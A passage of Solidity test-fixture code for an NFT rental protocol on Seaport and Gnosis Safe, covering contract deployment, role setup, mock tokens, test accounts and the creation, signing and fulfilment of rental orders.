                abi.encode(address(kernel))
            );

            // Deploy guard policy contract
            vm.prank(deployer.addr);
            guard = Guard(create2Deployer.deploy(salt, guardInitCode));

            // label the contract
            vm.label(address(guard), "GuardPolicy");
        }

        function _deployFactoryPolicy() internal {
            // abi encode the factory policy bytecode and constructor arguments
            bytes memory factoryInitCode = abi.encodePacked(
                type(Factory).creationCode,
                abi.encode(
                    address(kernel),
                    address(stop),
                    address(guard),
                    address(tokenCallbackHandler),
                    address(safeProxyFactory),
                    address(safeSingleton)
                )
            );

            // Deploy factory policy contract
            vm.prank(deployer.addr);
            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));

            // label the contract
            vm.label(address(factory), "FactoryPolicy");
        }

        function _setupKernel() internal {
            // Start impersonating the deployer
            vm.startPrank(deployer.addr);

            // Install modules
            kernel.executeAction(Actions.InstallModule, address(STORE));
            kernel.executeAction(Actions.InstallModule, address(ESCRW));

            // Approve policies
            kernel.executeAction(Actions.ActivatePolicy, address(create));
            kernel.executeAction(Actions.ActivatePolicy, address(stop));
            kernel.executeAction(Actions.ActivatePolicy, address(factory));
            kernel.executeAction(Actions.ActivatePolicy, address(guard));
            kernel.executeAction(Actions.ActivatePolicy, address(admin));

            // Grant `seaport` role to seaport protocol
            kernel.grantRole(toRole("SEAPORT"), address(seaport));

            // Grant `signer` role to the protocol signer to sign off on create payloads
            kernel.grantRole(toRole("CREATE_SIGNER"), rentalSigner.addr);

            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol
            kernel.grantRole(toRole("ADMIN_ADMIN"), deployer.addr);

            // Grant 'guard_admin` role to the address which can toggle hooks
            kernel.grantRole(toRole("GUARD_ADMIN"), deployer.addr);

            // Grant `stop_admin` role to the address which can skim funds from the payment escrow
            kernel.grantRole(toRole("STOP_ADMIN"), deployer.addr);

            // Stop impersonating the deployer
            vm.stopPrank();
        }

        function setUp() public virtual override {
            // setup dependencies
            super.setUp();

            // create the rental signer address and private key
            rentalSigner = vm.createWallet("rentalSigner");

            // create the deployer address and private key
            deployer = vm.createWallet("deployer");

            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)
            protocolVersion = 0x000000000000000000000100;
            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);

            // deploy kernel
            _deployKernel();

            // Deploy payment escrow
            _deployPaymentEscrowModule();

            // Deploy rental storage
            _deployStorageModule();

            // deploy create policy
            _deployCreatePolicy();

            // deploy stop policy
            _deployStopPolicy();

            // deploy admin policy
            _deployAdminPolicy();

            // Deploy guard policy
            _deployGuardPolicy();

            // deploy rental factory
            _deployFactoryPolicy();

            // intialize the kernel
            _setupKernel();
        }
    }


    // Creates test accounts to interact with the V3 protocol
    // Borrowed from test/fixtures/protocol/AccountCreator
    contract AccountCreator is Protocol {
        // Protocol accounts for testing
        ProtocolAccount public alice;
        ProtocolAccount public bob;
        ProtocolAccount public carol;
        ProtocolAccount public dan;
        ProtocolAccount public eve;
        ProtocolAccount public attacker;

        // Mock tokens for testing
        MockERC20[] public erc20s;
        MockERC721[] public erc721s;
        MockERC1155[] public erc1155s;

        function setUp() public virtual override {
            super.setUp();

            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens
            _deployTokens(3);

            // instantiate all wallets and deploy rental safes for each
            alice = _fundWalletAndDeployRentalSafe("alice");
            bob = _fundWalletAndDeployRentalSafe("bob");
            carol = _fundWalletAndDeployRentalSafe("carol");
            dan = _fundWalletAndDeployRentalSafe("dan");
            eve = _fundWalletAndDeployRentalSafe("eve");
            attacker = _fundWalletAndDeployRentalSafe("attacker");



        }

        function _deployTokens(uint256 numTokens) internal {
            for (uint256 i; i < numTokens; i++) {
                _deployErc20Token();
                _deployErc721Token();
                _deployErc1155Token();
            }
        }

        function _deployErc20Token() internal returns (uint256 i) {
            // save the token's index
            i = erc20s.length;

            // deploy the mock token
            MockERC20 token = new MockERC20();

            // push the token to the array of mocks
            erc20s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC20_", LibString.toString(i)));
        }

        function _deployErc721Token() internal returns (uint256 i) {
            // save the token's index
            i = erc721s.length;

            // deploy the mock token
            MockERC721 token = new MockERC721();

            // push the token to the array of mocks
            erc721s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC721_", LibString.toString(i)));
        }

        function _deployErc1155Token() internal returns (uint256 i) {
            // save the token's index
            i = erc1155s.length;

            // deploy the mock token
            MockERC1155 token = new MockERC1155();

            // push the token to the array of mocks
            erc1155s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC1155_", LibString.toString(i)));
        }

        function _deployRentalSafe(
            address owner,
            string memory name
        ) internal returns (address safe) {
            // Deploy a 1/1 rental safe
            address[] memory owners = new address[](1);
            owners[0] = owner;
            safe = factory.deployRentalSafe(owners, 1);



        }

        function _fundWalletAndDeployRentalSafe(
            string memory name
        ) internal returns (ProtocolAccount memory account) {
            // create a wallet with a address, public key, and private key
            Vm.Wallet memory wallet = vm.createWallet(name);

            // deploy a rental safe for the address
            address rentalSafe = _deployRentalSafe(wallet.addr, name);

            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s
            _allocateTokensAndApprovals(wallet.addr, 10000);

            // create an account
            account = ProtocolAccount({
                addr: wallet.addr,
                safe: SafeL2(payable(rentalSafe)),
                publicKeyX: wallet.publicKeyX,
                publicKeyY: wallet.publicKeyY,
                privateKey: wallet.privateKey
            });

        }

        function _allocateTokensAndApprovals(address to, uint128 amount) internal {
            // deal ether to the recipient
            vm.deal(to, amount);

            // mint all erc20 tokens to the recipient
            for (uint256 i = 0; i < erc20s.length; ++i) {
                erc20s[i].mint(to, amount);
            }

            // set token approvals
            _setApprovals(to);
        }

        function _setApprovals(address owner) internal {
            // impersonate the owner address
            vm.startPrank(owner);

            // set all approvals for erc20 tokens
            for (uint256 i = 0; i < erc20s.length; ++i) {
                erc20s[i].approve(address(conduit), type(uint256).max);
            }

            // set all approvals for erc721 tokens
            for (uint256 i = 0; i < erc721s.length; ++i) {
                erc721s[i].setApprovalForAll(address(conduit), true);
            }

            // set all approvals for erc1155 tokens
            for (uint256 i = 0; i < erc1155s.length; ++i) {
                erc1155s[i].setApprovalForAll(address(conduit), true);
            }

            // stop impersonating
            vm.stopPrank();
        }
    }



    interface ERC1155TokenReceiver {

        function onERC1155Received(
            address _operator,
            address _from,
            uint256 _id,
            uint256 _value,
            bytes calldata _data
        ) external returns (bytes4);

        function onERC1155BatchReceived(
            address _operator,
            address _from,
            uint256[] calldata _ids,
            uint256[] calldata _values,
            bytes calldata _data
        ) external returns (bytes4);
    }

    interface ERC721TokenReceiver {
        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);
    }

    interface IERC165 {
        function supportsInterface(bytes4 interfaceId) external view returns (bool);
    }


    /**
    * Borrowed from gnosis safe smart contracts
    * @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.
    * @author Richard Meissner - @rmeissner
    */
    contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {
        /**
        * @notice Handles ERC1155 Token callback.
        * return Standardized onERC1155Received return value.
        */
        function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {
            return 0xf23a6e61;
        }

        /**
        * @notice Handles ERC1155 Token batch callback.
        * return Standardized onERC1155BatchReceived return value.
        */
        function onERC1155BatchReceived(
            address,
            address,
            uint256[] calldata,
            uint256[] calldata,
            bytes calldata
        ) external pure override returns (bytes4) {
            return 0xbc197c81;
        }

        /**
        * @notice Handles ERC721 Token callback.
        *  return Standardized onERC721Received return value.
        */
        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
            return 0x150b7a02;
        }

        /**
        * @notice Handles ERC777 Token callback.
        * return nothing (not standardized)
        */
        function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {
            // We implement this for completeness, doesn't really have any value
        }

        /**
        * @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.
        * @param interfaceId Id of the interface.
        * @return if the interface is supported.
        */
        function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {
            return
                interfaceId == type(ERC1155TokenReceiver).interfaceId ||
                interfaceId == type(ERC721TokenReceiver).interfaceId ||
                interfaceId == type(IERC165).interfaceId;
        }

    }



    // Sets up logic in the test engine related to order creation
    // Borrowed from test/fixtures/engine/OrderCreator
    contract OrderCreator is AccountCreator {
        using OfferItemLib for OfferItem;
        using ConsiderationItemLib for ConsiderationItem;
        using OrderComponentsLib for OrderComponents;
        using OrderLib for Order;
        using ECDSA for bytes32;

        // defines a config for a standard order component
        string constant STANDARD_ORDER_COMPONENTS = "standard_order_components";

        struct OrderToCreate {
            ProtocolAccount offerer;
            OfferItem[] offerItems;
            ConsiderationItem[] considerationItems;
            OrderMetadata metadata;
        }

        // keeps track of tokens used during a test
        uint256[] usedOfferERC721s;
        uint256[] usedOfferERC1155s;

        uint256[] usedConsiderationERC721s;
        uint256[] usedConsiderationERC1155s;

        // components of an order
        OrderToCreate orderToCreate;

        function setUp() public virtual override {
            super.setUp();

            // Define a standard OrderComponents struct which is ready for
            // use with the Create Policy and the protocol conduit contract
            OrderComponentsLib
                .empty()
                .withOrderType(SeaportOrderType.FULL_RESTRICTED)
                .withZone(address(create))
                .withStartTime(block.timestamp)
                .withEndTime(block.timestamp + 100)
                .withSalt(123456789)
                .withConduitKey(conduitKey)
                .saveDefault(STANDARD_ORDER_COMPONENTS);

            // for each test token, create a storage slot
            for (uint256 i = 0; i < erc721s.length; i++) {
                usedOfferERC721s.push();
                usedConsiderationERC721s.push();

                usedOfferERC1155s.push();
                usedConsiderationERC1155s.push();
            }
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                                Order Creation                               //
        /////////////////////////////////////////////////////////////////////////////////

        // creates an order based on the provided context. The defaults on this order
        // are good for most test cases.
        function createOrder(
            ProtocolAccount memory offerer,
            OrderType orderType,
            uint256 erc721Offers,
            uint256 erc1155Offers,
            uint256 erc20Offers,
            uint256 erc721Considerations,
            uint256 erc1155Considerations,
            uint256 erc20Considerations
        ) internal {
            // require that the number of offer items or consideration items
            // dont exceed the number of test tokens
            require(
                erc721Offers <= erc721s.length &&
                    erc721Offers <= erc1155s.length &&
                    erc20Offers <= erc20s.length,
                "TEST: too many offer items defined"
            );
            require(
                erc721Considerations <= erc721s.length &&
                    erc1155Considerations <= erc1155s.length &&
                    erc20Considerations <= erc20s.length,
                "TEST: too many consideration items defined"
            );

            // create the offerer
            _createOfferer(offerer);

            // add the offer items
            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);

            // create the consideration items
            _createConsiderationItems(
                erc721Considerations,
                erc1155Considerations,
                erc20Considerations
            );

            // Create order metadata
            _createOrderMetadata(orderType);
        }

        // Creates an offerer on the order to create
        function _createOfferer(ProtocolAccount memory offerer) private {
            orderToCreate.offerer = offerer;
        }

        // Creates offer items which are good for most tests
        function _createOfferItems(
            uint256 erc721Offers,
            uint256 erc1155Offers,
            uint256 erc20Offers
        ) private {
            // generate the ERC721 offer items
            for (uint256 i = 0; i < erc721Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC721)
                        .withToken(address(erc721s[i]))
                        .withIdentifierOrCriteria(usedOfferERC721s[i])
                        .withStartAmount(1)
                        .withEndAmount(1)
                );

                // mint an erc721 to the offerer
                erc721s[i].mint(orderToCreate.offerer.addr);

                // update the used token so it cannot be used again in the same test
                usedOfferERC721s[i]++;
            }

            // generate the ERC1155 offer items
            for (uint256 i = 0; i < erc1155Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(erc1155s[i]))
                        .withIdentifierOrCriteria(usedOfferERC1155s[i])
                        .withStartAmount(100)
                        .withEndAmount(100)
                );

                // mint an erc1155 to the offerer
                erc1155s[i].mint(orderToCreate.offerer.addr, 100);

                // update the used token so it cannot be used again in the same test
                usedOfferERC1155s[i]++;
            }

            // generate the ERC20 offer items
            for (uint256 i = 0; i < erc20Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC20)
                        .withToken(address(erc20s[i]))
                        .withStartAmount(100)
                        .withEndAmount(100)
                );
            }
        }

        // Creates consideration items that are good for most tests
        function _createConsiderationItems(
            uint256 erc721Considerations,
            uint256 erc1155Considerations,
            uint256 erc20Considerations
        ) private {
            // generate the ERC721 consideration items
            for (uint256 i = 0; i < erc721Considerations; ++i) {
                // create the consideration item, and set the recipient as the offerer's
                // rental safe address
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(orderToCreate.offerer.safe))
                        .withItemType(ItemType.ERC721)
                        .withToken(address(erc721s[i]))
                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])
                        .withStartAmount(1)
                        .withEndAmount(1)
                );

                // update the used token so it cannot be used again in the same test
                usedConsiderationERC721s[i]++;
            }

            // generate the ERC1155 consideration items
            for (uint256 i = 0; i < erc1155Considerations; ++i) {
                // create the consideration item, and set the recipient as the offerer's
                // rental safe address
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(orderToCreate.offerer.safe))
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(erc1155s[i]))
                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])
                        .withStartAmount(100)
                        .withEndAmount(100)
                );

                // update the used token so it cannot be used again in the same test
                usedConsiderationERC1155s[i]++;
            }

            // generate the ERC20 consideration items
            for (uint256 i = 0; i < erc20Considerations; ++i) {
                // create the offer item
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(ESCRW))
                        .withItemType(ItemType.ERC20)
                        .withToken(address(erc20s[i]))
                        .withStartAmount(100)
                        .withEndAmount(100)
                );
            }
        }

        // Creates a order metadata that is good for most tests
        function _createOrderMetadata(OrderType orderType) private {
            // Create order metadata
            orderToCreate.metadata.orderType = orderType;
            orderToCreate.metadata.rentDuration = 500;
            orderToCreate.metadata.emittedExtraData = new bytes(0);
        }

        // creates a signed seaport order ready to be fulfilled by a renter
        function _createSignedOrder(
            ProtocolAccount memory _offerer,
            OfferItem[] memory _offerItems,
            ConsiderationItem[] memory _considerationItems,
            OrderMetadata memory _metadata
        ) private view returns (Order memory order, bytes32 orderHash) {
            // Build the order components
            OrderComponents memory orderComponents = OrderComponentsLib
                .fromDefault(STANDARD_ORDER_COMPONENTS)
                .withOfferer(_offerer.addr)
                .withOffer(_offerItems)
                .withConsideration(_considerationItems)
                .withZoneHash(create.getOrderMetadataHash(_metadata))
                .withCounter(seaport.getCounter(_offerer.addr));

            // generate the order hash
            orderHash = seaport.getOrderHash(orderComponents);

            // generate the signature for the order components
            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);

            // create the order, but dont provide a signature if its a PAYEE order.
            // Since PAYEE orders are fulfilled by the offerer of the order, they
            // dont need a signature.
            if (_metadata.orderType == OrderType.PAYEE) {
                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());
            } else {
                order = OrderLib
                    .empty()
                    .withParameters(orderComponents.toOrderParameters())
                    .withSignature(signature);
            }
        }

        function _signSeaportOrder(
            uint256 signerPrivateKey,
            bytes32 orderHash
        ) private view returns (bytes memory signature) {
            // fetch domain separator from seaport
            (, bytes32 domainSeparator, ) = seaport.information();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(orderHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                               Order Amendments                              //
        /////////////////////////////////////////////////////////////////////////////////

        function resetOrderToCreate() internal {
            delete orderToCreate;
        }

        function withOfferer(ProtocolAccount memory _offerer) internal {
            orderToCreate.offerer = _offerer;
        }

        function resetOfferer() internal {
            delete orderToCreate.offerer;
        }

        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {
            // reset all current offer items
            resetOfferItems();

            // add the new offer items to storage
            for (uint256 i = 0; i < _offerItems.length; i++) {
                orderToCreate.offerItems.push(_offerItems[i]);
            }
        }

        function withOfferItem(OfferItem memory offerItem) internal {
            orderToCreate.offerItems.push(offerItem);
        }

        function resetOfferItems() internal {
            delete orderToCreate.offerItems;
        }

        function popOfferItem() internal {
            orderToCreate.offerItems.pop();
        }

        function withReplacedConsiderationItems(
            ConsiderationItem[] memory _considerationItems
        ) internal {
            // reset all current consideration items
            resetConsiderationItems();

            // add the new consideration items to storage
            for (uint256 i = 0; i < _considerationItems.length; i++) {
                orderToCreate.considerationItems.push(_considerationItems[i]);
            }
        }

        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {
            orderToCreate.considerationItems.push(considerationItem);
        }

        function resetConsiderationItems() internal {
            delete orderToCreate.considerationItems;
        }

        function popConsiderationItem() internal {
            orderToCreate.considerationItems.pop();
        }

        function withHooks(Hook[] memory hooks) internal {
            // delete the current metatdata hooks
            delete orderToCreate.metadata.hooks;

            // add each metadata hook to storage
            for (uint256 i = 0; i < hooks.length; i++) {
                orderToCreate.metadata.hooks.push(hooks[i]);
            }
        }

        function withOrderMetadata(OrderMetadata memory _metadata) internal {
            // update the static metadata parameters
            orderToCreate.metadata.orderType = _metadata.orderType;
            orderToCreate.metadata.rentDuration = _metadata.rentDuration;
            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;

            // update the hooks
            withHooks(_metadata.hooks);
        }

        function resetOrderMetadata() internal {
            delete orderToCreate.metadata;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                              Order Finalization                             //
        /////////////////////////////////////////////////////////////////////////////////

        function finalizeOrder()
            internal
            returns (Order memory, bytes32, OrderMetadata memory)
        {
            // create and sign the order
            (Order memory order, bytes32 orderHash) = _createSignedOrder(
                orderToCreate.offerer,
                orderToCreate.offerItems,
                orderToCreate.considerationItems,
                orderToCreate.metadata
            );

            // pull order metadata into memory
            OrderMetadata memory metadata = orderToCreate.metadata;

            // clear structs
            resetOrderToCreate();

            return (order, orderHash, metadata);
        }
    }


    // Sets up logic in the test engine related to order fulfillment
    // Borrowed from test/fixtures/engine/OrderFulfiller
    contract OrderFulfiller is OrderCreator {
        using ECDSA for bytes32;

        struct OrderToFulfill {
            bytes32 orderHash;
            RentPayload payload;
            AdvancedOrder advancedOrder;
        }

        // components of a fulfillment
        ProtocolAccount fulfiller;
        OrderToFulfill[] ordersToFulfill;
        Fulfillment[] seaportMatchOrderFulfillments;
        FulfillmentComponent[][] seaportOfferFulfillments;
        FulfillmentComponent[][] seaportConsiderationFulfillments;
        address seaportRecipient;

        /////////////////////////////////////////////////////////////////////////////////
        //                             Fulfillment Creation                            //
        /////////////////////////////////////////////////////////////////////////////////

        // creates an order fulfillment
        function createOrderFulfillment(
            ProtocolAccount memory _fulfiller,
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) internal {
            // set the fulfiller account
            fulfiller = _fulfiller;

            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via
            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well
            seaportRecipient = address(_fulfiller.safe);

            // get a pointer to a new order to fulfill
            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();

            // create an order fulfillment
            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));

            // add the order hash and fulfiller
            orderToFulfill.orderHash = orderHash;

            // create rental zone payload data
            _createRentalPayload(
                orderToFulfill.payload,
                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)
            );

            // generate the signature for the payload
            bytes memory signature = _signProtocolOrder(
                rentalSigner.privateKey,
                create.getRentPayloadHash(orderToFulfill.payload)
            );

            // create an advanced order from the order. Pass the rental
            // payload as extra data
            _createAdvancedOrder(
                orderToFulfill.advancedOrder,
                AdvancedOrder(
                    order.parameters,
                    1,
                    1,
                    order.signature,
                    abi.encode(orderToFulfill.payload, signature)
                )
            );
        }

        function _createOrderFulfiller(
            ProtocolAccount storage storageFulfiller,
            ProtocolAccount memory _fulfiller
        ) private {
            storageFulfiller.addr = _fulfiller.addr;
            storageFulfiller.safe = _fulfiller.safe;
            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;
            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;
            storageFulfiller.privateKey = _fulfiller.privateKey;
        }

        function _createOrderFulfillment(
            OrderFulfillment storage storageFulfillment,
            OrderFulfillment memory fulfillment
        ) private {
            storageFulfillment.recipient = fulfillment.recipient;
        }

        function _createOrderMetadata(
            OrderMetadata storage storageMetadata,
            OrderMetadata memory metadata
        ) private {
            // Create order metadata in storage
            storageMetadata.orderType = metadata.orderType;
            storageMetadata.rentDuration = metadata.rentDuration;
            storageMetadata.emittedExtraData = metadata.emittedExtraData;

            // dynamically push the hooks from memory to storage
            for (uint256 i = 0; i < metadata.hooks.length; i++) {
                storageMetadata.hooks.push(metadata.hooks[i]);
            }
        }

        function _createRentalPayload(
            RentPayload storage storagePayload,
            RentPayload memory payload
        ) private {
            // set payload fulfillment on the order to fulfill
            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);

            // set payload metadata on the order to fulfill
            _createOrderMetadata(storagePayload.metadata, payload.metadata);

            // set payload expiration on the order to fulfill
            storagePayload.expiration = payload.expiration;

            // set payload intended fulfiller on the order to fulfill
            storagePayload.intendedFulfiller = payload.intendedFulfiller;
        }

        function _createAdvancedOrder(
            AdvancedOrder storage storageAdvancedOrder,
            AdvancedOrder memory advancedOrder
        ) private {
            // create the order parameters on the order to fulfill
            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);

            // create the rest of the static parameters on the order to fulfill
            storageAdvancedOrder.numerator = advancedOrder.numerator;
            storageAdvancedOrder.denominator = advancedOrder.denominator;
            storageAdvancedOrder.signature = advancedOrder.signature;
            storageAdvancedOrder.extraData = advancedOrder.extraData;
        }

        function _createOrderParameters(
            OrderParameters storage storageOrderParameters,
            OrderParameters memory orderParameters
        ) private {
            // create the static order parameters for the order to fulfill
            storageOrderParameters.offerer = orderParameters.offerer;
            storageOrderParameters.zone = orderParameters.zone;
            storageOrderParameters.orderType = orderParameters.orderType;
            storageOrderParameters.startTime = orderParameters.startTime;
            storageOrderParameters.endTime = orderParameters.endTime;
            storageOrderParameters.zoneHash = orderParameters.zoneHash;
            storageOrderParameters.salt = orderParameters.salt;
            storageOrderParameters.conduitKey = orderParameters.conduitKey;
            storageOrderParameters.totalOriginalConsiderationItems = orderParameters
                .totalOriginalConsiderationItems;

            // create the dynamic order parameters for the order to fulfill
            for (uint256 i = 0; i < orderParameters.offer.length; i++) {
                storageOrderParameters.offer.push(orderParameters.offer[i]);
            }
            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {
                storageOrderParameters.consideration.push(orderParameters.consideration[i]);
            }
        }

        function _createSeaportFulfillment(
            Fulfillment storage storageFulfillment,
            Fulfillment memory fulfillment
        ) private {
            // push the offer components to storage
            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {
                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);
            }

            // push the consideration components to storage
            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {
                storageFulfillment.considerationComponents.push(
                    fulfillment.considerationComponents[i]
                );
            }
        }

        function _seaportItemTypeToRentalItemType(
            SeaportItemType seaportItemType
        ) internal pure returns (RentalItemType) {
            if (seaportItemType == SeaportItemType.ERC20) {
                return RentalItemType.ERC20;
            } else if (seaportItemType == SeaportItemType.ERC721) {
                return RentalItemType.ERC721;
            } else if (seaportItemType == SeaportItemType.ERC1155) {
                return RentalItemType.ERC1155;
            } else {
                revert("seaport item type not supported");
            }
        }

        function _createRentalOrder(
            OrderToFulfill memory orderToFulfill
        ) internal view returns (RentalOrder memory rentalOrder) {
            // get the order parameters
            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;

            // get the payload
            RentPayload memory payload = orderToFulfill.payload;

            // get the metadata
            OrderMetadata memory metadata = payload.metadata;

            // construct a rental order
            rentalOrder = RentalOrder({
                seaportOrderHash: orderToFulfill.orderHash,
                items: new Item[](parameters.offer.length + parameters.consideration.length),
                hooks: metadata.hooks,
                orderType: metadata.orderType,
                lender: parameters.offerer,
                renter: payload.intendedFulfiller,
                rentalWallet: payload.fulfillment.recipient,
                startTimestamp: block.timestamp,
                endTimestamp: block.timestamp + metadata.rentDuration
            });

            // for each new offer item being rented, create a new item struct to add to the rental order
            for (uint256 i = 0; i < parameters.offer.length; i++) {
                // PAYEE orders cannot have offer items
                require(
                    metadata.orderType != OrderType.PAYEE,
                    "TEST: cannot have offer items in PAYEE order"
                );

                // get the offer item
                OfferItem memory offerItem = parameters.offer[i];

                // determine the item type
                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);

                // determine which entity the payment will settle to
                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20
                    ? SettleTo.RENTER
                    : SettleTo.LENDER;

                // create a new rental item
                rentalOrder.items[i] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: offerItem.token,
                    amount: offerItem.startAmount,
                    identifier: offerItem.identifierOrCriteria
                });
            }

            // for each consideration item in return, create a new item struct to add to the rental order
            for (uint256 i = 0; i < parameters.consideration.length; i++) {
                // PAY orders cannot have consideration items
                require(
                    metadata.orderType != OrderType.PAY,
                    "TEST: cannot have consideration items in PAY order"
                );

                // get the offer item
                ConsiderationItem memory considerationItem = parameters.consideration[i];

                // determine the item type
                RentalItemType itemType = _seaportItemTypeToRentalItemType(
                    considerationItem.itemType
                );

                // determine which entity the payment will settle to
                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&
                    considerationItem.itemType == SeaportItemType.ERC20
                    ? SettleTo.RENTER
                    : SettleTo.LENDER;

                // calculate item index offset
                uint256 itemIndex = i + parameters.offer.length;

                // create a new payment item
                rentalOrder.items[itemIndex] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: considerationItem.token,
                    amount: considerationItem.startAmount,
                    identifier: considerationItem.identifierOrCriteria
                });
            }
        }

        function _signProtocolOrder(
            uint256 signerPrivateKey,
            bytes32 payloadHash
        ) internal view returns (bytes memory signature) {
            // fetch domain separator from create policy
            bytes32 domainSeparator = create.domainSeparator();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(payloadHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            Fulfillment Amendments                           //
        /////////////////////////////////////////////////////////////////////////////////

        function withFulfiller(ProtocolAccount memory _fulfiller) internal {
            fulfiller = _fulfiller;
        }

        function withRecipient(address _recipient) internal {
            seaportRecipient = _recipient;
        }

        function withAdvancedOrder(
            AdvancedOrder memory _advancedOrder,
            uint256 orderIndex
        ) internal {
            // get a storage pointer to the order to fulfill
            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];

            // set the new advanced order
            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);
        }

        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {
            // get a pointer to a new seaport fulfillment
            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

            // set the fulfillment
            _createSeaportFulfillment(
                fulfillment,
                Fulfillment({
                    offerComponents: _fulfillment.offerComponents,
                    considerationComponents: _fulfillment.considerationComponents
                })
            );
        }

        function withSeaportMatchOrderFulfillments(
            Fulfillment[] memory fulfillments
        ) internal {
            // reset all current seaport match order fulfillments
            resetSeaportMatchOrderFulfillments();

            // add the new offer items to storage
            for (uint256 i = 0; i < fulfillments.length; i++) {
                // get a pointer to a new seaport fulfillment
                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

                // set the fulfillment
                _createSeaportFulfillment(
                    fulfillment,
                    Fulfillment({
                        offerComponents: fulfillments[i].offerComponents,
                        considerationComponents: fulfillments[i].considerationComponents
                    })
                );
            }
        }

        function withBaseOrderFulfillmentComponents() internal {
            // create offer fulfillments. We need to specify which offer items can be aggregated
            // into one transaction. For example, 2 different orders where the same seller is offering
            // the same item in each.
            //
            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment
            // is created for each order.
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                // get a pointer to a new offer fulfillment array. This array will contain indexes of
                // orders and items which are all grouped on whether they can be combined in a single transferFrom()
                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments
                    .push();

                // number of offer items in the order
                uint256 offerItemsInOrder = ordersToFulfill[i]
                    .advancedOrder
                    .parameters
                    .offer
                    .length;

                // add a single fulfillment component for each offer item in the order
                for (uint256 j = 0; j < offerItemsInOrder; j++) {
                    offerFulfillments.push(
                        FulfillmentComponent({orderIndex: i, itemIndex: j})
                    );
                }
            }

            // create consideration fulfillments. We need to specify which consideration items can be aggregated
            // into one transaction. For example, 3 different orders where the same fungible consideration items are
            // expected in return.
            //
            // get a pointer to a new offer fulfillment array. This array will contain indexes of
            // orders and items which are all grouped on whether they can be combined in a single transferFrom()
            FulfillmentComponent[]
                storage considerationFulfillments = seaportConsiderationFulfillments.push();

            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because
            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the
            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer
